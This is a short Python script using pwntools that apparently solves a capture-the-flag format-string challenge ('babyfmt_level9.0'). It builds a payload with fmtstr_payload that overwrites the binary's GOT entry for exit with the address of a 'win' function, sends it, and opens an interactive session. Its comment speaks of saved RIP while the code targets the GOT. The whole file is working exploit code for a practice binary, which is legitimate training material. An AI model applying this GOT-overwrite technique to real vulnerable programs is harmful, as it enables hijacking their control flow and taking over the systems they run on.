from pwn import *
BINARY = "/challenge/babyfmt_level9.0"

context.arch = 'amd64'


elf = ELF(BINARY)

p = process(BINARY)

# write win addr to saved rip

payload = b"A" * 6 + fmtstr_payload(78, {elf.got['exit']: elf.sym['win']}, numbwritten = 138 + 6)
print(payload)
p.send(payload)
p.interactive()